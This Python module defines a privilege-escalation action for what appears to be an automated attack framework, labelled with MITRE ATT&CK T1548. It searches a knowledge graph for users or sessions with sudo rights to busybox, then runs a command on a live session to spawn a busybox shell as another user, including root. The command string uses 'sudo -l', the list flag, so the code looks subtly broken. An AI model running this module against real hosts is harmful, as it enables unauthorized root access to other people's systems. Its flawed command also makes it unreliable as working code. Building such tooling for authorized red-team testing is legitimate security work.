from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import run_command
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


class BusyBoxGTFO(Action):
    """
    Run busybox command as another user.
    """

    def __init__(self):
        super().__init__(
            "BusyBoxGTFO", "T1548 Abuse Elevation Control Mechanism", "TA0004 Privilege Escalation", ["quiet", "fast"]
        )
        self.noise = 0.5
        self.impact = 0.6

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        user = pattern.get('user')
        session = pattern.get('session')._id
        permission = pattern.get('permission')._id
        if user:
            username = user.get('username')
            return [f"Change user to {username} in session ({session}) with permission ({permission})"]
        else:
            return [f"Change to busybox session ({session}) with permission ({permission})"]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        get_target_patterns check to identify a user with permission to run the busybox
        command.
        """
        session = Entity('Session', alias='session')
        pattern = (
            Entity(type='User', alias='user')
            .with_edge(Relationship(type='has'))
            .with_node(Entity(type='Permission', alias='permission', command='/usr/bin/busybox'))
            .combine(session)
        )
        pattern_root = session.with_edge(Relationship(type='has')).with_node(
            Entity(type='Permission', alias='permission', command='/bin/busybox')
        )
        return kg.match(pattern).where('user.username = session.username') + kg.match(pattern_root).where(
            'permission.as_user = root'
        )

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Establish busybox session as another user.
        """
        tulpa_session = pattern.get('session')
        tulpa_session_id = tulpa_session.get('id')
        permission = pattern.get('permission')
        as_user = permission.get('as_user')

        live_session = sessions.get_session(tulpa_session_id)
        cmd = f"sudo -l {as_user} busybox sh"
        output = live_session.run_command(cmd)
        return ActionExecutionResult(command=cmd, session=tulpa_session_id, stdout=output)

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update session object to reflect a change in protocol.
        """
        session = pattern.get('session')
        permission = pattern.get('permission')
        as_user = permission.get('as_user')
        update_session = session.copy()
        update_session.set('active', False)
        changes: StateChangeSequence = [(session, "update", update_session)]
        busybox_session = Entity(
            'Session',
            alias='busybox_session',
            protocol='busybox',
            username=as_user,
            active=True,
            executes_on=session.get('executes_on'),
            id=session.get('id'),
        )
        merge_pattern = update_session.with_edge(Relationship('spawned', direction='r')).with_node(busybox_session)
        changes.append((update_session, "merge", merge_pattern))
        return changes